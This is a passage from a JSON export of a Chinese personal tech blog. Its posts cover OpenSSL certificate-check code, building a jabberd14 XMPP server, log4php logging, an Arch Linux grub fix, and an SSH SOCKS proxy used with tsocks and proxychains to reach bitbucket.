#99cc99;\">return</span> 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/* </span><span style=\"color: #999999; font-style: italic;\">Check the certificate </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">switch</span>(SSL_get_verify_result(ssl))\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">case</span> X509_V_OK:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">break</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">case</span> X509_V_ERR_CERT_NOT_YET_VALID:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">case</span> X509_V_ERR_CERT_HAS_EXPIRED:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(timeInfo.server != -1 &amp;&amp; timeInfo.client != -1)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   printf(<span style=\"color: #66cccc;\">\"&#24403;&#21069;&#23458;&#25143;&#31471;&#26102;&#38388;: %s\"</span>, ctime(&amp;timeInfo.client));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   printf(<span style=\"color: #66cccc;\">\"&#24403;&#21069;&#26381;&#21153;&#22120;&#26102;&#38388;: %s\"</span>, ctime(&amp;timeInfo.server));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   printf(<span style=\"color: #66cccc;\">\"&#23581;&#35797;&#19982;&#26381;&#21153;&#22120;&#26102;&#38388;&#21516;&#27493;\"</span>);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(syncSystemTime(timeInfo.server))\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   printf(<span style=\"color: #66cccc;\">\"&#25104;&#21151;\\n\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">else</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   printf(<span style=\"color: #66cccc;\">\"&#22833;&#36133;\\n\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   printf(<span style=\"color: #66cccc;\">\"&#35831;&#37325;&#35797;&#36830;&#25509;&#26381;&#21153;&#22120;&#65281;\\n\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">default</span>:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"Certificate verification error: %i\\n\"</span>, SSL_get_verify_r<span style=\"text-decoration: underline;\">esult(ssl));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   BIO_free_all(bio);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   SSL_CTX_free(ctx);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/* </span><span style=\"color: #999999; font-style: italic;\">Close the connection and free the context </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   BIO_free_all(bio);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   SSL_CTX_free(ctx);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> 0;\n}\n</pre>\n</div>\n</li>\n</ul>\n"
},
{
  "title": "搭建jabber服务器",
  "timestamp": "2011-05-04 00:32:00",
  "tags": [
    "jabber",
    "linux"
  ],
  "body": "<ul class=\"org-ul\">\n<li>编译安装\n\n<p>\n<code>下载</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget http://download.jabberd.org/jabberd14/jabberd14-1.6.1.1.tar.gz\ntar xzvf jabberd14-1.6.1.1.tar.gz\n<span style=\"color: #cc99cc;\">cd</span> jabberd14-1.6.1.1\n</pre>\n</div>\n\n<p>\n<code>修改代码以解决编译错误</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">diff -r jabberd14-1.6.1.1/jabberd/lib/xmlnode.cc tmp/jabberd14-1.6.1.1/jabberd/l<span style=\"text-decoration: underline;\">ib/xmlnode.cc</span>\n882,884c882,884\n&lt;     const char *next_step = NULL;\n&lt;     const char *start_predicate = NULL;\n&lt;     const char *end_predicate = NULL;\n---\n&gt;     char *next_step = NULL;\n&gt;     char *start_predicate = NULL;\n&gt;     char *end_predicate = NULL;\n1836c1836\n&lt;         ((char*)strchr(lang, <span style=\"color: #66cccc;\">'-'</span>))[0] = 0;\n---\n&gt;         strchr(lang, <span style=\"color: #66cccc;\">'-'</span>)[0] = 0;\ndiff -r jabberd14-1.6.1.1/jabberd/log.cc tmp/jabberd14-1.6.1.1/jabberd/log.cc\n89c89\n&lt;         pos = (char*)strchr(zone,<span style=\"color: #66cccc;\">'.'</span>);\n---\n&gt;     pos = strchr(zone,<span style=\"color: #66cccc;\">'.'</span>);\ndiff -r jabberd14-1.6.1.1/jabberd/mio_tls.cc tmp/jabberd14-1.6.1.1/jabberd/mio_t<span style=\"text-decoration: underline;\">ls.cc</span>\n615c615\n&lt;         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pub<span style=\"text-decoration: underline;\">file, privfile, GNUTLS_OPENPGP_FMT_BASE64);</span>\n---\n&gt;         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pub<span style=\"text-decoration: underline;\">file, privfile);</span>\n634c634\n&lt;         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials,<span style=\"text-decoration: underline;\"> file, GNUTLS_OPENPGP_FMT_BASE64);</span>\n---\n&gt;         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials,<span style=\"text-decoration: underline;\"> file);</span>\n640a641,657\n&gt;     }\n&gt;\n&gt;     // load GnuPG trustdb\n&gt;     if (j_strcmp(xmlnode_get_localname(cur), <span style=\"color: #66cccc;\">\"trustdb\"</span>) == 0) {\n&gt;         char const *const file = xmlnode_get_data(cur);\n&gt;\n&gt;         if (file == NULL) {\n&gt;         log_warn(NULL, <span style=\"color: #66cccc;\">\"Initializing TLS subsystem: &lt;trustdb/&gt; element inside </span><span style=\"color: #66cccc; text-decoration: underline;\">the TLS configuration, that does not contain a file-name.\"</span><span style=\"text-decoration: underline;\">);</span>\n&gt;         continue;\n&gt;         }\n&gt;\n&gt;         // load the GnuPG trustdb\n&gt;         ret = gnutls_certificate_set_openpgp_trustdb(current_credentials, file<span style=\"text-decoration: underline;\">);</span>\n&gt;         if (ret &lt; 0) {\n&gt;         log_error(NULL, <span style=\"color: #66cccc;\">\"Error loading GnuPG trustdb %s: %s\"</span>, file, gnutls_str<span style=\"text-decoration: underline;\">error(ret));</span>\n&gt;         continue;\n&gt;         }\n</pre>\n</div>\n\n<p>\n<code>编译安装</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./configure &amp;&amp; make &amp;&amp; sudo make install\n</pre>\n</div>\n\n<p>\n如出错通常是少了相关依赖库，用包管理工具（如：ubuntu下的新立得）安装即可。\n</p>\n</li>\n\n<li>配置\n\n<p>\n按照mysql.sql中的注释配置数据库：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mysql -uroot -p\nmysql&gt; CREATE DATABASE jabber CHARACTER SET utf8;\nmysql&gt; use jabber;\nmysql&gt; grant all on jabber.* to jabber@localhost identified by <span style=\"color: #66cccc;\">'secret'</span>;\nmysql&gt; <span style=\"color: #66cccc;\">\\.</span> mysql.sql\n</pre>\n</div>\n</li>\n\n<li>运行\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo jabberd -h localhost -B\n</pre>\n</div>\n</li>\n\n<li>注册用户1\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">telnet localhost 5222\n&lt;stream:stream\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #ffcc66;\">to</span>=<span style=\"color: #66cccc;\">'localhost'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #ffcc66;\">xmlns</span>=<span style=\"color: #66cccc;\">'jabber:client'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> xmlns:<span style=\"color: #ffcc66;\">stream</span>=<span style=\"color: #66cccc;\">'http://etherx.jabber.org/streams'</span>&gt;\n\n&lt;iq <span style=\"color: #ffcc66;\">id</span>=<span style=\"color: #66cccc;\">'reg1'</span> <span style=\"color: #ffcc66;\">type</span>=<span style=\"color: #66cccc;\">'set'</span>&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> &lt;query <span style=\"color: #ffcc66;\">xmlns</span>=<span style=\"color: #66cccc;\">'jabber:iq:register'</span>&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;username&gt;jack&lt;/username&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;password&gt;jack&lt;/password&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;name&gt;jack&lt;/name&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;email&gt;&lt;/email&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> &lt;/query&gt;\n&lt;/iq&gt;\n\n&lt;/stream:stream&gt;\n</pre>\n</div>\n</li>\n\n<li>登录用户1\n\n<pre class=\"example\">\nEmpathy菜单-&gt;编辑-&gt;帐户-&gt;添加：\n协议: Jabber\n登录ID: jack@localhost\n记住密码\n密码: jack\n登录\n</pre>\n</li>\n\n<li>注册用户2\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">telnet localhost 5222\n&lt;stream:stream\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #ffcc66;\">to</span>=<span style=\"color: #66cccc;\">'localhost'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #ffcc66;\">xmlns</span>=<span style=\"color: #66cccc;\">'jabber:client'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> xmlns:<span style=\"color: #ffcc66;\">stream</span>=<span style=\"color: #66cccc;\">'http://etherx.jabber.org/streams'</span>&gt;\n\n&lt;iq <span style=\"color: #ffcc66;\">id</span>=<span style=\"color: #66cccc;\">'reg1'</span> <span style=\"color: #ffcc66;\">type</span>=<span style=\"color: #66cccc;\">'set'</span>&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> &lt;query <span style=\"color: #ffcc66;\">xmlns</span>=<span style=\"color: #66cccc;\">'jabber:iq:register'</span>&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;username&gt;rose&lt;/username&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;password&gt;rose&lt;/password&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;name&gt;rose&lt;/name&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;email&gt;&lt;/email&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> &lt;/query&gt;\n&lt;/iq&gt;\n\n&lt;/stream:stream&gt;\n</pre>\n</div>\n</li>\n\n<li>用户1加用户2为联系人\n\n<pre class=\"example\">\nEmpathy菜单-&gt;聊天-&gt;添加联系人:\n帐户：jack@localhost\n标识符: rose@localhost\n添加\n</pre>\n</li>\n\n<li>登录用户2，并发一个消息给用户1\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">telnet localhost 5222\n&lt;stream:stream\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #ffcc66;\">to</span>=<span style=\"color: #66cccc;\">'localhost'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #ffcc66;\">xmlns</span>=<span style=\"color: #66cccc;\">'jabber:client'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> xmlns:<span style=\"color: #ffcc66;\">stream</span>=<span style=\"color: #66cccc;\">'http://etherx.jabber.org/streams'</span>&gt;\n\n&lt;iq <span style=\"color: #ffcc66;\">id</span>=<span style=\"color: #66cccc;\">'auth1'</span> <span style=\"color: #ffcc66;\">type</span>=<span style=\"color: #66cccc;\">'set'</span>&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> &lt;query <span style=\"color: #ffcc66;\">xmlns</span>=<span style=\"color: #66cccc;\">'jabber:iq:auth'</span>&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;username&gt;rose&lt;/username&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;password&gt;rose&lt;/password&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;resource&gt;test&lt;/resource&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> &lt;/query&gt;\n&lt;/iq&gt;\n\n&lt;presence/&gt;\n\n&lt;message <span style=\"color: #ffcc66;\">to</span>=<span style=\"color: #66cccc;\">'jack@localhost'</span>&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> &lt;body&gt;hello, jack&lt;/body&gt;\n&lt;/message&gt;\n\n&lt;/stream:stream&gt;\n</pre>\n</div>\n</li>\n</ul>\n"
},
{
  "title": "log4php初步使用",
  "timestamp": "2013-05-06 18:32:00",
  "tags": [
    "log4php"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">简介</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\napache出品必属精品。正宗php日志库，与log4j一脉相承。\n</p>\n\n<p>\n<a href=\"http://logging.apache.org/log4php/\">http://logging.apache.org/log4php/</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">安装</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n参考：<a href=\"http://logging.apache.org/log4php/install.html\">http://logging.apache.org/log4php/install.html</a>\n</p>\n\n<ul class=\"org-ul\">\n<li>有root权限，安装到系统目录\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo apt-get install php-pear\nsudo pear channel-discover pear.apache.org/log4php\nsudo pear install log4php/Apache_log4php\n</pre>\n</div>\n</li>\n\n<li>没有root权限，安装到当前目录下\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">cd</span> libs\nwget http://mirrors.tuna.tsinghua.edu.cn/apache/logging/log4php/2.3.0/apache-log<span style=\"text-decoration: underline;\">4php-2.3.0-src.tar.gz</span>\ntar xzvf apache-log4php-2.3.0-src.tar.gz\nln -sf apache-log4php-2.3.0/src/main/php ./log4php\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">使用</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>进行一下封装定制，可以满足绝大部分情况下的使用\n\n<ul class=\"org-ul\">\n<li>类似nginx的访问日志记录格式\n</li>\n<li>日志中输出文件名及行号\n</li>\n<li>日志文件数据限制为10个，每个日志文件大小为10MB\n</li>\n</ul>\n<p>\n<a href=\"../static/logging.inc\">logging.inc</a>\n</p>\n</li>\n\n<li>使用示例\n\n<p>\n<code>example.php</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #cc99cc;\">&lt;?php</span>\ndefine(<span style=\"color: #66cccc;\">'LOGGING_APPNAME'</span>, <span style=\"color: #66cccc;\">'example'</span>);\n<span style=\"color: #99cc99;\">require_once</span>(dirname(<span style=\"color: #6699cc;\">__FILE__</span>) . <span style=\"color: #66cccc;\">\"/logging.inc\"</span>);\n\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">logger</span> = <span style=\"color: #6699cc;\">Logger</span>::getLogger(<span style=\"color: #66cccc;\">\"main\"</span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">logger</span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">debug</span>(<span style=\"color: #66cccc;\">\"info log\"</span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">logger</span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">warn</span>(<span style=\"color: #66cccc;\">\"info log\"</span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">logger</span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">error</span>(<span style=\"color: #66cccc;\">\"info log\"</span>);\n<span style=\"color: #cc99cc;\">?&gt;</span>\n</pre>\n</div>\n</li>\n\n<li>运行结果\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">$ php ./example.php\n$ tail -f ./logs/example.log\n2013-05-06 18:24:57,925 [DEBUG] main: info log (/home/tangxinfa/php/example.php:<span style=\"text-decoration: underline;\">6)</span>\n2013-05-06 18:24:57,930 [WARN] main: info log (/home/tangxinfa/php/example.php:7<span style=\"text-decoration: underline;\">)</span>\n2013-05-06 18:24:57,930 [ERROR] main: info log (/home/tangxinfa/php/example.php:<span style=\"text-decoration: underline;\">8)</span>\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "《理解Http与Spdy协议》培训课件",
  "timestamp": "2013-05-23 13:11:00",
  "tags": [
    "http",
    "spdy"
  ],
  "body": "<p>\n本课件针对刚入职的毕业生，讲解Http与Spdy协议的基础知识。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">开发计划 <code>[1/5]</code></h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li><code>[X]</code> 编写Http部分大纲\n</li>\n<li><code>[&#xa0;]</code> 编写Http部分章节内容\n</li>\n<li><code>[&#xa0;]</code> 编写Spdy部分大纲\n</li>\n<li><code>[&#xa0;]</code> 编写Spdy部分章节内容\n</li>\n<li><code>[&#xa0;]</code> 制作Microsoft PowerPoint格式文档\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">在线演示</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n<a href=\"http://blog.kankanan.com/slides/%E7%90%86%E8%A7%A3Http%E4%B8%8ESpdy%E5%8D%8F%E8%AE%AE.html\">《理解Http与Spdy协议》</a></p>\n</div>\n</div>\n"
},
{
  "title": "《理解Node.js》培训课件",
  "timestamp": "2013-07-04 18:31:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n本课件介绍Node.js的特点及其初步使用。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">开发计划 <code>[1/3]</code></h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li><code>[X]</code> 编写大纲\n</li>\n<li><code>[&#xa0;]</code> 编写内容\n</li>\n<li><code>[&#xa0;]</code> 制作Microsoft PowerPoint格式文档\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">在线演示</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n<a href=\"http://blog.kankanan.com/slides/%E7%90%86%E8%A7%A3Node.js.html\">《理解Node.js》</a></p>\n</div>\n</div>\n"
},
{
  "title": "Archlinux下解决更新grub后无法进入gnome3桌面的问题",
  "timestamp": "2013-06-26 10:07:00",
  "tags": [
    "archlinux"
  ],
  "body": "<p>\n在启动界面上会看到以下错误日志：\n</p>\n<pre class=\"example\">\nkernel: [    8.398186] [drm:radeon_init] *ERROR* No UMS support in radeon module!\n</pre>\n\n<p>\n这个是由于grub配置文件中指定了内核参数 <code>nomodeset</code> 导致，linux的默认配置是为了运行服务器，以减少启动过程中出错的可能性，使用gnome3桌面时，需去掉内核参数 <code>nomodeset</code> ，以下为<a href=\"https://wiki.archlinux.org/index.php/ATI#Disable_KMS\">原文</a>：\n</p>\n\n<pre class=\"example\">\nNote: Adding nomodeset to the kernel boot line might prevent GNOME 3's gnome-shell or KDE's desktop effects from running.\n</pre>\n"
},
{
  "title": "linux下翻墙访问bitbucket.org仓库",
  "timestamp": "2013-06-28 13:57:00",
  "tags": [
    "linux",
    "hg",
    "bitbucket"
  ],
  "body": "<p>\n今天往bitbucket.org push时才发现bitbucket被GFW了。我的仓库为Mercurial hg，hg项目根目录下的 <code>.hg/hgrc</code> 配置文件中可指定http_proxy，试了一下不支持socks代理（我的浏览器用它来翻墙），最终使用tsocks软件实现翻墙访问bitbucket.org仓库。\n</p>\n\n<ul class=\"org-ul\">\n<li>利用vps建本地socks代理的脚本 <code>ssh_proxy.sh</code>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #ffcc66;\">n</span>=<span style=\"color: #cc99cc;\">`ps waux | grep 'bash .*/ssh_proxy.sh' | grep -v grep | wc -l`</span>\n<span style=\"color: #99cc99;\">if</span> [ $<span style=\"color: #ffcc66;\">n</span> -lt 3 ]; <span style=\"color: #99cc99;\">then</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">while</span> [ true ]; <span style=\"color: #99cc99;\">do</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">n</span>=<span style=\"color: #cc99cc;\">`ps aux | grep 'ssh' | grep '7070' | grep -v grep | wc -l`</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> [ $<span style=\"color: #ffcc66;\">n</span> -lt 1 ]; <span style=\"color: #99cc99;\">then</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"start ssh connecting\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ssh -qTnNf -D 7070 user@host\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">fi</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"wait for next checking\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 30\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">done</span>\n<span style=\"color: #99cc99;\">fi</span>\n<span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"ssh_proxy.sh already running\"</span>\n</pre>\n</div>\n\n<p>\n请将user@host改为你的vps用户及主机，并配置为免输入密码。\n</p>\n</li>\n\n<li>启动socks代理脚本\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">nohup bash ./ssh_proxy.sh &amp;\n</pre>\n</div>\n\n<p>\n浏览器也可以利用它来翻墙。\n</p>\n</li>\n\n<li>安装tsocks\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S tsocks\n</pre>\n</div>\n</li>\n\n<li>配置tsocks\n\n<p>\n<code>/etc/tsocks.conf</code>\n</p>\n<pre class=\"example\">\n# We can access 192.168.0.* directly\nlocal = 192.168.0.0/255.255.255.0\nlocal = 10.0.0.0/255.0.0.0\n\n# Otherwise we use the server\nserver = 127.0.0.1\nserver_port = 7070\n</pre>\n<p>\n具体用法 <code>man tsocks.conf</code>\n</p>\n</li>\n\n<li>使用tsocks让hg用上socks代理功能\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">tsocks hg push\n</pre>\n</div>\n<p>\ntsocks看起来很通用，应该也可以让git等进行socks代理访问。\n</p>\n</li>\n</ul>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">更好的选择 proxychains</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\ntsocks 不支持代理访问 https\n</p>\n\n<pre class=\"example\">\n$ tsocks curl https://www.baidu.com\ncurl: (7) Failed to connect to www.baidu.com port 443: Connection refused\n</pre>\n\n<p>\nproxychains 支持代理访问 https\n</p>\n\n<pre class=\"example\">\n$ proxychains curl https://www.baidu.com\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/libproxychains4.so\n[proxychains] DLL init: proxychains-ng 4.11\n[proxychains] Dynamic chain  ...  127.0.0.1:7070  ...  www.baidu.com:443  ...  OK\n&lt;html&gt;\n&lt;head&gt;\n    &lt;script&gt;\n        location.replace(location.href.replace(\"https://\",\"http://\"));\n    &lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;noscript&gt;&lt;meta http-equiv=\"refresh\" content=\"0;url=http://www.baidu.com/\"&gt;&lt;/noscript&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</pre>\n\n<p>\nproxychains 的安装配置请参考\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"https://sites.google.com/a/pickdreams.org/snail-library/Home/yong-tsocks-heproxychains-dai-lilinux-xia-suo-you-ruan-jian\">用tsocks和proxychains代理Linux下所有软件 - 蜗牛图书馆</a>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "使用番茄工作法的感受",
  "timestamp": "2013-07-08 13:10:00",
  "tags": [
    "pomodoro"
  ],
